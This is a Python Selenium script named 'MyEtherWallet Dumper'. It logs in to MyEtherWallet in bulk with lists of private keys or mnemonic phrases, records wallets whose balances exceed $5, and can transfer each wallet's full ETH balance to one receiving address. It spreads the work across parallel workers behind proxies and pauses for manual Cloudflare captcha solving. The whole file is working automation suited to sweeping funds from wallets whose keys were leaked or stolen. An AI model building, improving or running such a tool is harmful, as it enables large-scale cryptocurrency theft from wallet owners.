from ethdumper.setup_logger import ConsoleLogger
import sys, time
import argparse
from tqdm import tqdm
from multiprocessing.dummy import Pool
from urllib3.connectionpool import xrange
from base64 import b64encode
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchWindowException, InvalidSessionIdException, ElementClickInterceptedException, WebDriverException
from tenacity import retry, retry_if_exception_type, wait_fixed
import traceback

from bs4 import BeautifulSoup
import requests
import json


class RetryException(Exception):

    def __init__(self):

        pass


def shard(input_list, n):
    """ Yield successive n-sized chunks from an input list."""
    for i in xrange(0, len(input_list), n):
        yield input_list[i:i + n]


def setup_driver():

    fp = webdriver.FirefoxProfile()
    # Options for proxy.
    if http_proxy or https_proxy or socks_proxy:

        if proxy_uname:
            # Setup the login information if the proxy uses auth.
            credentials = f"{proxy_uname}:{proxy_pass}"
            credentials = b64encode(credentials.encode('utf-8')).decode('utf-8')
            fp.set_preference("extensions.closeproxyauth.authtoken", credentials)

        if http_proxy:
            proxy_host = http_proxy.split(":")[0]
            proxy_port = int(http_proxy.split(":")[1])
        if https_proxy:
            proxy_host = https_proxy.split(":")[0]
            proxy_port = int(https_proxy.split(":")[1])
        if socks_proxy:
            proxy_host = socks_proxy.split(":")[0]
            proxy_port = int(socks_proxy.split(":")[1])
            fp.set_preference("network.proxy.socks", proxy_host)
            fp.set_preference("network.proxy.socks_port", proxy_port)

        else:

            fp.set_preference("network.proxy.http", proxy_host)
            fp.set_preference("network.proxy.http_port", proxy_port)
            fp.set_preference("network.proxy.https", proxy_host)
            fp.set_preference("network.proxy.https_port", proxy_port)
            fp.set_preference("network.proxy.ssl", proxy_host)
            fp.set_preference("network.proxy.ssl_port", proxy_port)
            fp.set_preference("network.proxy.ftp", proxy_host)
            fp.set_preference("network.proxy.ftp_port", proxy_port)

        fp.set_preference("network.proxy.type", 1)
        fp.update_preferences()

    # Options for automatically downloading shit.
    fp.set_preference("browser.download.folderList", 2)
    fp.set_preference("browser.download.manager.showWhenStarting", False)
    fp.set_preference("browser.download.dir", "./")
    fp.set_preference("browser.helperApps.neverAsk.openFile", "text/csv,text/plain,application/comma-separated-values,application/x-gzip,application/octet-stream")
    fp.set_preference("browser.helperApps.neverAsk.saveToDisk", "text/csv,text/plain,application/comma-separated-values,application/x-gzip,application/octet-stream")
    fp.update_preferences()

    logger.debug(f"Setting up driver with: HTTP Proxy: {http_proxy}, SSL Proxy: {https_proxy}, SOCKS proxy: {socks_proxy}, Proxy Uname: {proxy_uname}, Proxy Pass: {proxy_pass}")
    driver = webdriver.Firefox(firefox_profile=fp)
    # Set default timeouts
    driver.set_page_load_timeout(120)

    return driver


def pad_zeros(privKey):
    # Wallets must be 64 chars. If they're less, pad them out with 0s.
    if len(privKey) < 64:
        key = "0" * (64-len(privKey)) + privKey
    elif len(privKey) > 65:
        key = None  # Key is invalid!
    else:
        key = privKey

    return key


def session_init(driver):
    # When the driver first connects to myetherwallet, it has a popup.
    url = "https://www.myetherwallet.com/"

    try:
        driver.get(url)
        # Click the stupid "Welcome to MEW" button if its there.
        try:
            # Detect CloudFlare
            cf_please_wait_xpath = '//*[@id="cf-please-wait"]'
            driver.find_element_by_xpath(cf_please_wait_xpath)
            logger.warn(f"Cloudflare Detected! Manually solve for worker or revise proxy settings.")
            logger.spam(
                f"Hit CloudFlare. Check proxy settings: HTTP_Proxy {http_proxy}, SSL Proxy: {https_proxy}, SOCKS proxy: {socks_proxy}, Proxy Uname: {proxy_uname}, Proxy Pass: {proxy_pass}")
            wait_for_captcha_solve(driver)

        except NoSuchElementException as cfe:
            logger.spam(f"Checking for cloudflare... PASSED: {cfe}")

        onward_btn_xpath = "/html/body/div[1]/div[3]/div[1]/div/div/div/div/div/div[2]/button"
        onward_button = WebDriverWait(driver, 20).until(
            EC.element_to_be_clickable((By.XPATH, onward_btn_xpath))
        )
        onward_button.click()
        return True
    except TimeoutException as e:
        logger.debug(f"Welcome to MEW button not detected: {e}")
        return False


def init_chevron_station(mnemonic):

    driver = setup_driver()
    session_init(driver)


def get_usd_totals():
    total_usd = 0
    for ticker in usd_totals:
        total_usd += usd_totals[ticker]
    return "{:.2f}".format(total_usd)


def parse_page(html, privKey):

    soup = BeautifulSoup(html, 'html.parser')
    eth_balance_div = soup.find("div", {"class": "balance-text"})
    eth_balance = eth_balance_div.text
    eth_balance = eth_balance.replace("ETH", "")  # Strip out 'ETH', we know what it is.
    eth_balance = eth_balance.replace(" ", "")  # Strip out whitespace.
    eth_usd_value = "{:.2f}".format(float(eth_balance) * token_exchange_rate['ETH'])

    totals = {
        "privKey": privKey,
        "ETH": eth_balance,
        "ETH-USD": eth_usd_value,
    }

    if float(eth_usd_value) > 5:
        logger.success(f"{privKey}: {eth_balance} ETH (${eth_usd_value})")
        if "ETH" in usd_totals:
            usd_totals["ETH"] += float(eth_usd_value)
        else:
            usd_totals["ETH"] = float(eth_usd_value)
    else:
        logger.debug(f"{privKey} {eth_balance} (${eth_usd_value})")

    token_table_div = soup.find("div", {"class": "token-table-container"})
    token_table = token_table_div.find_all("table")
    for table in token_table:
        rows = table.find_all("tr")
        for row in rows:
            ticker = row.find("span").text
            tds = row.find_all("td")
            token_balance = tds[1].text
            token_balance = token_balance.replace("...", "")  # Strip ellipses
            token_balance = token_balance.replace(" ", "")  # strip whitespace
            ex_rate = get_token_price(ticker)
            if ex_rate:
                token_usd_value = "{:.2f}".format(float(token_balance) * ex_rate)
            else:
                token_usd_value = 0.00
            if float(token_usd_value) > 5:
                logger.success(f"{privKey}: {token_balance} {ticker} (${token_usd_value})")
                totals[ticker] = {"balance": token_balance, "token_usd": token_usd_value}
                if ticker in usd_totals:
                   usd_totals[ticker] += float(token_usd_value)
                else:
                    usd_totals[ticker] = float(token_usd_value)
            else:
                logger.debug(f"{privKey}: {token_balance} {ticker} (${token_usd_value})")
    if outfile:
        outfile.write(json.dumps(totals)+"\n")
    return totals


def get_token_price(token):
    """
    Search this token ticker on Cryptocompare and return its USD balance. Not all pairs will have values, and some may
    be misrepresented. For example there are two different tokens with "LIGHT" as the designator. If no exchange rate
    is found, it will update the global token_exchange_rate dict with the token-usd pairing.

    :param token: Token ticker. Ex: USDT
    :return: The exchange rate of each token to $USD.
    """

    if token not in token_exchange_rate:

        api_url = f"https://min-api.cryptocompare.com/data/price?fsym={token}&tsyms=USD"
        req = requests.get(api_url)
        price_per_token = json.loads(req.content)
        logger.spam(f"Cryptocompare API {token}: ${price_per_token}")
        usd_price = price_per_token.get('USD')
        token_exchange_rate[token] = usd_price

    else:
        usd_price = token_exchange_rate[token]

    return usd_price

@retry(retry=retry_if_exception_type(RetryException))
def wait_for_captcha_solve(driver):
    """
    Enter an infinite loop of checking the driver for the XPath for the "Access Wallet" card on the page. This will
    have the effect of allowing the worker to wait until a manual captcha solve is done.

    :param driver: Selenium webdriver to wait on.
    :param privKey: the privKey we were attempting to check.
    :return: return True once solved.
    """
    try:
        access_wallet_card_xpath = "/html/body/div[1]/div[3]/div[1]/div/div/div[2]/a[2]"
        access_wallet_card = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.XPATH, access_wallet_card_xpath))
        )
        return True
    except Exception as e:
        logger.spam(f"Did not detect Captcha solve yet. Checking again in 10s: {e}")
        raise RetryException


def key_helper(privKey):
    """
    Inputs a private key or mnemonic and conducts basic sanity checks.

    :param privKey: Either a 12 or 24 character mnemonic or 64 character private key.
    :return: Returns mnemonic length or zero-padded private key.
    """
    num_words = len(privKey.rstrip(' ').split(' '))
    if num_words == 12 or num_words == 24:
        return num_words
    else:
        # Wallets must be 64 chars. If they're less, pad them out with 0s.
        if len(privKey) < 64:
            key = "0" * (64 - len(privKey)) + privKey
        elif len(privKey) > 65:
            key = None  # Key is invalid!
        else:
            key = privKey
        return key


@retry(retry=retry_if_exception_type(RetryException), wait=wait_fixed(10))
def do_login(driver, privKey):
    """
    Login a key. Can be a mnemonic or private key.
    :param driver: Selenium driver to use for this automation.
    :param privKey: The 64-char private key or mnemonic key.
    :param isMnemonic: Whether or not the key is a mnemonic
    :return: HTML of the page, if login is successful.
    """
    url = "https://www.myetherwallet.com/"
    padded_key = key_helper(privKey)
    timeout = 60

    if padded_key:
        # Yeah its kind of redundant on the first login, but every other login will allow a logout of the previous key by getting this page.
        try:
            time.sleep(2)  # Give it a bit of a rest so geckodriver doesn't crash under heavy load.
            driver.get(url)
            time.sleep(2)
        except TimeoutException as e:
            logger.warn(f"{privKey}: Issue logging in with this key. Skipping. Error: {e}")
            logger.spam(traceback.print_exc())
            return False

    else:
        logger.error(f"{privKey}: Invalid private key! Skipping.")
        return False

    # Use this in case we get an intercepted click to ditch the toast notification.
    main_body_xpath = "/html/body"
    main_body = WebDriverWait(driver, timeout).until(
        EC.presence_of_element_located((By.XPATH, main_body_xpath))
    )

    try:
        # Click the "Access My Wallet" card.
        access_wallet_card_xpath = "/html/body/div[1]/div[3]/div[1]/div/div/div[2]/a[2]"
        access_wallet_card = WebDriverWait(driver, timeout).until(
                EC.element_to_be_clickable((By.XPATH, access_wallet_card_xpath))
            )
        try:
            access_wallet_card.click()
        except ElementClickInterceptedException:
            # Try to get rid of the toast notification
            main_body.click()
            main_body.send_keys(Keys.ENTER)
            time.sleep(0.5)
            access_wallet_card.click()

        # Click the "Software" card.
        software_card_xpath = "/html/body/div[1]/div[3]/div[1]/div[6]/div/div[2]/button[4]"
        software_card = WebDriverWait(driver, timeout).until(
            EC.element_to_be_clickable((By.XPATH, software_card_xpath))
        )

        try:
            software_card.click()
        except ElementClickInterceptedException:
            # Sometimes this happens, we'll click somewhere and then click again.
            language_xpath = "/html/body/div[1]/div[2]/div[2]/div[5]/div/div/div/div/ul/div[1]/li/a/div"
            language_btn = WebDriverWait(driver, timeout).until(
                EC.presence_of_element_located((By.XPATH, language_xpath))
            )
            language_btn.click()
            # Try clicking again
            software_card.click()

        # Don't click this yet, we need to determine which key type we will be using.
        continue_btn_xpath = "/html/body/div[1]/div[3]/div[1]/div[2]/div[1]/div/div/div/div[2]/div[2]/div/div/button[2]"
        continue_btn = WebDriverWait(driver, timeout).until(
                EC.presence_of_element_located((By.XPATH, continue_btn_xpath))
            )

        if padded_key == 12 or padded_key == 24:
            # Click the "Mnemonic Phrase" button option.
            mnemoic_phrase_xpath = "/html/body/div[1]/div[3]/div[1]/div[2]/div[1]/div/div/div/div[2]/div[1]/div[1]/div[2]/div/div/div/span"
            mnemonic_phrase_btn = WebDriverWait(driver, timeout).until(
                    EC.element_to_be_clickable((By.XPATH, mnemoic_phrase_xpath))
                )
            mnemonic_phrase_btn.click()

            # Click the "Continue" button.
            continue_btn.click()

            # Punch in the Mnemonic Phrase.
            privKey = privKey.replace(" ", "\t")  # Replace spaces with tabs.
            first_phrase_xpath = "/html/body/div[1]/div[3]/div[1]/div[2]/div[1]/div/div/div/div[2]/form/div[1]/ul/li[1]/input"
            first_phrase_box = WebDriverWait(driver, timeout).until(
                EC.element_to_be_clickable((By.XPATH, first_phrase_xpath))
            )
            first_phrase_box.send_keys(privKey)

        else:
            # Click the "Private Key" button option.
            priv_key_btn_xpath = "/html/body/div[1]/div[3]/div[1]/div[2]/div[1]/div/div/div/div[2]/div[1]/div[1]/div[3]/div"
            priv_key_btn = WebDriverWait(driver, timeout).until(
                    EC.element_to_be_clickable((By.XPATH, priv_key_btn_xpath))
                )
            priv_key_btn.click()

            # Click the "Continue" button.
            continue_btn.click()

            # Punch in the private key
            priv_key_input_xpath = "/html/body/div[1]/div[3]/div[1]/div[2]/div[1]/div/div/div/div[2]/div[1]/div[1]/input"
            priv_key_input = WebDriverWait(driver, timeout).until(
                EC.element_to_be_clickable((By.XPATH, priv_key_input_xpath))
            )
            priv_key_input.send_keys(padded_key)

        # Access the wallet. If the wallet is invalid, it should timeout here and skip.
        access_wallet_btn_xpath = "/html/body/div[1]/div[3]/div[1]/div[2]/div[1]/div/div/div/div[2]/div[1]/div[2]/div"
        access_wallet_btn = WebDriverWait(driver, timeout).until(
            EC.element_to_be_clickable((By.XPATH, access_wallet_btn_xpath))
        )
        try:
            access_wallet_btn.click()
        except ElementClickInterceptedException:
            # Sometimes a toast notification pops up in the way... try to get rid of it.
            main_body.send_keys(Keys.ESCAPE)
            main_body.click()
            time.sleep(0.5)
            access_wallet_btn.click()
        try:
            # Sometimes there is an error window. Lets click this if its visible.
            error_window_xpath = '//*[@id="__BVID__38___BV_modal_body_"]'
            error_window = driver.find_element_by_xpath(error_window_xpath)
            if error_window.is_displayed():

                no_thanks_xpath = "/html/body/div[1]/div[2]/div[2]/div[5]/div/div/div[1]/div/div/div/div/div[3]/div[2]/button[2]"
                no_thanks_btn = WebDriverWait(driver, timeout).until(
                    EC.element_to_be_clickable((By.XPATH, no_thanks_xpath))
                )
                no_thanks_btn.click()
        except NoSuchElementException:
            pass

        # Something to look for after logging in before dumping the HTML.
        balance_block_xpath = "/html/body/div[1]/div[3]/div[9]/div[2]/div/div[2]/div/div[2]"
        balance_block = WebDriverWait(driver, timeout).until(
            EC.presence_of_element_located((By.XPATH, balance_block_xpath))
        )

        # Wait for the tokens to load by waiting for the fucking spinner to stop spinning. When it does, the HTML is ready to dump.
        token_loading_spinner = "/html/body/div[1]/div[3]/div[9]/div[2]/div/div[5]/div/div[2]/div[1]/div[3]/div[1]"
        token_spinner = WebDriverWait(driver, timeout).until(
            EC.invisibility_of_element((By.XPATH, token_loading_spinner))
        )

        token_container_xpath = "/html/body/div[1]/div[3]/div[9]/div[2]/div/div[5]/div/div[2]/div[1]/div[3]"
        token_container = WebDriverWait(driver, timeout).until(
            EC.visibility_of_element_located((By.XPATH, token_container_xpath))
        )
        # Click the ETH balance refresh button to make sure its up to date.
        balance_refresh_xpath = "/html/body/div[1]/div[3]/div[9]/div[2]/div/div[2]/div/div[2]/div[2]/div[2]/button[2]/img"
        balance_refresh_btn = WebDriverWait(driver, timeout).until(
            EC.element_to_be_clickable((By.XPATH, balance_refresh_xpath))
        )
        balance_refresh_btn.click()
        # Wait for it to stop spinning.
        balance_spinner_xpath = "/html/body/div[1]/div[3]/div[9]/div[2]/div/div[2]/div/div[2]/div[2]/div[2]/button[2]/i"
        balance_spinner = WebDriverWait(driver, timeout).until(
            EC.invisibility_of_element((By.XPATH, balance_spinner_xpath))
        )

        return driver.page_source

    except TimeoutException as e:
        logger.warn(f"Worker failed to login with {padded_key}. Skipping...")
        logger.spam(traceback.print_exc())
        return False
    except (NoSuchWindowException, InvalidSessionIdException, WebDriverException) as worker_error:
        logger.error(f"Driver crashed for worker when processing {privKey}. Will retry this. {worker_error}")
        logger.spam(traceback.print_exc())
        raise RetryException


def dump_eth(driver, privKey, results):

    timeout = 60
    logger.info(f"{privKey}: Attempting to transfer {results.get('ETH')} ETH (${results.get('ETH-USD')}) to {rxwallet}")
    send_tx_card_xpath = "/html/body/div[1]/div[3]/div[9]/div[2]/div/div[4]/div[1]/div[1]/div[2]/div[1]/div/div/div"
    send_tx_card_btn = WebDriverWait(driver, timeout).until(
        EC.element_to_be_clickable((By.XPATH, send_tx_card_xpath))
    )
    send_tx_card_btn.click()
    not_enough_gas_xpath = "/html/body/div[1]/div[3]/div[9]/div[2]/div/div[4]/div[2]/div/div[1]/div[2]/div[3]"
    try:
        not_enough_gas = driver.find_element_by_xpath(not_enough_gas_xpath)
        if not_enough_gas.is_displayed():
            logger.warn(f"{privKey}: Not enough gas to send balance. Skipping")
            return False
    except NoSuchElementException:
        pass
    try:
        # Input the --to-wallet address to dump this Ethereum to.
        to_address_xpath = "/html/body/div[1]/div[3]/div[9]/div[2]/div/div[4]/div[2]/div/div[2]/div/div[3]/div/div[1]/input"
        to_address = WebDriverWait(driver, timeout).until(
            EC.element_to_be_clickable((By.XPATH, to_address_xpath))
        )
        to_address.click()
        to_address.send_keys(rxwallet)

        # Click the button to populate the entire balance automatically.
        entire_balance_xpath = "/html/body/div[1]/div[3]/div[9]/div[2]/div/div[4]/div[2]/div/div[1]/div[2]/div[1]/p"
        entire_balance_btn = WebDriverWait(driver, timeout).until(
            EC.element_to_be_clickable((By.XPATH, entire_balance_xpath))
        )
        entire_balance_btn.click()

        # Send the transaction.
        send_tx_xpath = "/html/body/div[1]/div[3]/div[9]/div[2]/div/div[4]/div[4]/div[1]"

        send_tx_btn = WebDriverWait(driver, timeout).until(
            EC.element_to_be_clickable((By.XPATH, send_tx_xpath))
        )
        try:
            send_tx_btn.click()
        except ElementClickInterceptedException:
            # Sometimes the footer obscures the button, so we want to scroll down a bit so that doesn't happen, then try clicking again.
            main_div_xpath = "/html/body"
            main_div = WebDriverWait(driver, timeout).until(
                EC.element_to_be_clickable((By.XPATH, main_div_xpath))
            )
            main_div.send_keys(Keys.PAGE_DOWN)
            time.sleep(0.5)
            send_tx_btn.click()

        # Confirm and sent the transaction
        send_tx_confirmation_xpath = "/html/body/div[1]/div[6]/div[1]/div/div[1]/div/div/div/div/div[3]/div/div[1]/button[2]"
        send_tx_confirmation_btn = WebDriverWait(driver, timeout).until(
            EC.element_to_be_clickable((By.XPATH, send_tx_confirmation_xpath))
        )
        send_tx_confirmation_btn.click()

        logger.success(f"{privKey}: Successfully transferred {results.get('ETH')} (${results.get('ETH-USD')}) to {rxwallet}")
        return True
    except TimeoutException as e:
        logger.error(f"{privKey}: Was not a able to dump {results.get('ETH')} (${results.get('ETH-USD')}) on this wallet for some reason. Skipping. Error: {e}")
        logger.spam(traceback.print_exc())
        return False


def run_worker(chunked_work):

    driver = setup_driver()
    logger.info(f"Worker thread started, handling {len(chunked_work)} tasks and fetching current ETH-USD exchange rate.")
    eth_usd = get_token_price("ETH")
    logger.spam(f"Current ETH-USD exchange rate is {eth_usd}")
    session_init(driver)  # Get rid of the pop-up if it's there.
    for privKey in chunked_work:
        try:
            html = do_login(driver, privKey=privKey)
            if html:
                results = parse_page(html, privKey)
                if float(results.get('ETH')) > 0 and rxwallet:
                    dump_eth(driver, privKey, results)
            if pbar.last_print_n % 100 == 0:
                logger.info(f"Totals so far in all wallets: ${get_usd_totals()}: {usd_totals}")
        except Exception as unhandled:
            logger.error(f"Unhandled exception when processing {privKey}. {unhandled}")
            logger.error(traceback.print_exc())
        pbar.update()
    driver.close()


def main():

    parser = argparse.ArgumentParser('MyEtherWallet Dumper')
    # Switched args
    parser.add_argument("-v", dest="verbose", action='count', default=1,
                        help="Enable verbose output. Ex: -v, -vv, -vvv")
    parser.add_argument("-iL", "--input-list", dest="inlist", help="Use a list of private keys.")
    parser.add_argument("-k", "--key", dest="singlekey", help="Use only a single private key.")
    parser.add_argument("-w", "--workers", dest="workers", default=12, help="Number of selenium workers to use. Default: 12")
    parser.add_argument("-o", "--outfile", dest="outfile", action="store", help="Dump results to this JSON file.")

    proxy_settings = parser.add_argument_group("Proxy Settings")
    proxy_settings.add_argument("--http-proxy", dest="http_proxy", default=None, help="HTTP Proxy for Selenium. Ex: 127.0.0.1:8080")
    proxy_settings.add_argument("--https-proxy", dest="https_proxy", default=None, help="HTTPS Proxy for Selenium. Ex: 127.0.0.1:8080")
    proxy_settings.add_argument("--socks-proxy", dest="socks_proxy", default=None, help="SOCKS Proxy for Selenium. Ex: 127.0.0.1:9050")
    proxy_settings.add_argument("--proxy-user", dest="proxy_uname", default=None, help="Username for proxy authentication.")
    proxy_settings.add_argument("--proxy-pass", dest="proxy_pass", default=None, help="Password for proxy authentication.")

    tx_opts = parser.add_argument_group("Transfer options")
    tx_opts.add_argument("--to-wallet", dest="rxwallet", help="Dump everything in the wallet to this address.")
    tx_opts.add_argument("--fill-gas", dest="chevron", action="store", help="If the TX wallet doesn't have the required gas, fill it first from this private key. (File pointing to mnemonic)")

    args = parser.parse_args()

    global vlevel
    vlevel = args.verbose
    global logger
    logger = ConsoleLogger(vlevel)
    global pbar
    global workers
    workers = int(args.workers)
    global http_proxy
    http_proxy = args.http_proxy
    global https_proxy
    https_proxy = args.https_proxy
    global socks_proxy
    socks_proxy = args.socks_proxy
    global proxy_uname
    proxy_uname = args.proxy_uname
    global proxy_pass
    proxy_pass = args.proxy_pass
    global outfile
    if args.outfile:
        outfile = open(args.outfile, 'a+')
    else:
        outfile = None
    global token_exchange_rate
    token_exchange_rate = dict()
    global usd_totals
    usd_totals = dict()
    global token_totals
    token_totals = dict()
    global master_priv_key
    master_priv_key = args.chevron
    global chevron_driver

    global rxwallet
    rxwallet = args.rxwallet


    if args.inlist:
        f = open(args.inlist, 'r')
        keys = list((l.rstrip("\n") for l in f))
    elif args.singlekey:
        keys = [args.singlekey]
    else:
        logger.error("Please specify either --key or -iL to input a single or list of private keys to check.")
        sys.exit(1)

    pbar = tqdm(total=len(keys), unit=" wallets", maxinterval=0.1, mininterval=0)

    chunk_size = int(len(keys)/workers)
    if chunk_size == 0:
        chunk_size = 1

    try:
        logger.info(f'Start time: {time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())}')
        p = Pool(workers)
        if master_priv_key:
            logger.debug(f"Loaded master mnemonic for wallets that don't have enough gas.")
            chevron_driver = init_chevron_station(master_priv_key)
        for _ in p.imap_unordered(run_worker, shard(keys, chunk_size)):
            pass

    except KeyboardInterrupt:
        pbar.close()
        logger.warning("Keyboard interrupt. Please wait, cleaning up...")
    finally:
        pbar.close()
        logger.info(f'End time: {time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())}')


if __name__ == "__main__":

    main()
